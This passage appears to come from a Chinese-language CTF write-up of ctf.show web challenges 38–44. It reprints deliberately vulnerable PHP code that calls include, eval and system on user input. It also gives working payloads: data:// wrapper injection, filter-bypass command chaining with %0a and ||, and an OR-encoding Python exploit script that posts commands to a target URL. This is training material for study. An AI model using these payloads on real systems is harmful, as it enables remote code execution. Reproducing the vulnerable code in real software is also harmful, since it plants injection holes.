</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?c=data://text/plain,<?=system("tac%20fla*")?></p>
<p>或者</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web39">web39<a hidden class="anchor" aria-hidden="true" href="#web39">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:13:21
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这里会在我们传入的c后面拼接一段.php</p>
<p>我们只需要在加入<?php ?>那么php就只会执行中间的代码，后面的内容不会执行</p>
<p>故payload：</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p></blockquote>
<h4 id="web40">web40<a hidden class="anchor" aria-hidden="true" href="#web40">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:03:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽关键词 /[0-9]|~|`|@|#|\$|%|^|&amp;|*|\（|\）|-|=|+|{|[|]|}|:|'|&quot;|,|&lt;|.|&gt;|/|?|\\</p>
<p>这里要使用无参命令执行</p>
<p>payload：</p>
<blockquote>
<p>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote>
<p>关于无参命令执行的一些解释</p>
<p><img alt="image-20241109165447576" loading="lazy" src="assets/202411091654772.png"></p>
<h4 id="web41">web41<a hidden class="anchor" aria-hidden="true" href="#web41">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: 羽
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:31:22
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:40:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: 1341963450@qq.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctf.show
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo(</span><span class="si">$c</span><span class="s2">);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>过滤内容：<code>/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i</code></p>
<p>这个题过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或<a href="https://so.csdn.net/so/search?q=%e8%bf%90%e7%ae%97%e7%ac%a6&amp;spm=1001.2101.3001.7020">运算符</a><code>|</code>。
我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>
<p>大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  
</span></span><span class="line"><span class="ln">24</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">|</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;php rce_or.php&#34;</span><span class="p">)</span>  <span class="c1">#没有将php写入环境变量需手动运行</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;USER：python exp.py &lt;url&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;eg：  python exp.py http://ctf.show/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">url</span><span class="o">=</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">   
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">   <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">       <span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">   <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] result:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><p>将两个文件放在同一个文件夹，运行exp.py即可</p>
<p>羽师傅nb</p>
<p><img alt="image-20241124223329525" loading="lazy" src="assets/image-20241124223329525.png"></p>
<blockquote>
<p>注意链接要用http不能用https</p></blockquote>
<h4 id="web42">web42<a hidden class="anchor" aria-hidden="true" href="#web42">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 20:51:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这道题会将我们输入的命令与<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>进行拼接</p>
<blockquote>
<p>/dev/null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显</p></blockquote>
<p>导致我们无法成功执行</p>
<p>我们可以通过<code>%0a</code>截断的方式绕过</p>
<blockquote>
<p>tac fl*%0a</p></blockquote>
<p>or</p>
<blockquote>
<p>; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
&amp; //两条命令都会执行
&amp;&amp; //两条命令都会执行</p>
<p>过滤了分号和cat，可以用||和&amp;来代替分号，tac代替cat</p>
<p>可构造playload:
url/?c=tac flag.php||
url/?c=tac flag.php%26
注意，这里的&amp;需要url编码</p></blockquote>
<h4 id="web43">web43<a hidden class="anchor" aria-hidden="true" href="#web43">#</a></h4>
<p>过滤了cat、；，</p>
<p>不是很影响</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac flag.php||

...
//记得转url编码
</code></pre><h4 id="web44">web44<a hidden class="anchor" aria-hidden="true" href="#web44">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:32:01
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/;|cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
